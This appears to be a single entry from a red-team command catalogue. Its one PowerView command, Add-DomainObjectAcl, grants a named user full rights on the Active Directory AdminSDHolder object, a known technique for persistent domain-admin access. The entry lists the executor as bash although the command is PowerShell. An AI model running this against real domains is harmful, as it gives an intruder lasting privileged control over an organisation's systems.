---
id: 3d897546-0ba0-4b07-b2c4-121a605346d0
name: Add user to AdminSDHolder group
type: command
executor: bash
data: Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local'
  -PrincipalIdentity username -Rights All -Verbose
output: null
created_at: '2023-04-06T03:56:06.430321+00:00'
updated_at: '2023-04-10T20:26:37.633229+00:00'
---

# Add user to AdminSDHolder group

```bash
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose
```
